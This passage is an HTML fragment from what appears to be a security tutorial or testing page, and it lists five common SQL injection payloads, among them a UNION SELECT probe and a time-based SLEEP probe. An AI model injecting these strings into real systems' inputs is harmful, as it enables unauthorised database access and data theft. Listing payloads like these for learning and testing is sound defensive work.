                    <li><code>' OR '1'='1</code></li>
                    <li><code>' UNION SELECT 1,2,3--</code></li>
                    <li><code>' AND 1=1--</code></li>
                    <li><code>' AND SLEEP(5)--</code></li>
                    <li><code>' AND (SELECT COUNT(*) FROM users)>0--</code></li>
                </ul>
